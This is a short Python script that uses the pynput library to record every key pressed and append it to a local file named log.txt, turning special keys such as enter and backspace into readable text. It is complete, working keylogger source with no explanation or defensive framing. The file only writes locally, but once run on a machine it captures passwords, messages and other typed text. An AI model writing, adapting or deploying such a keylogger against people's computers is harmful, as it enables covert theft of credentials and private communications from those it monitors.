import pynput

# path to the log file where the keystrokes will be saved
LOG_FILE = "log.txt"

def logKey(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
        letter = " "
    if letter == "Key.backspace":
        letter = "<BACKSPACE>"
    if letter == "Key.shift_r" or letter == "Key.shift_l" or letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.caps_lock":
        letter = "<CAPSLOCK>"
    with open(LOG_FILE, "a") as f:
        f.write(letter)
def main():
    with pynput.keyboard.Listener(on_press=logKey) as l:
        l.join()
if __name__ == "__main__":
    main()
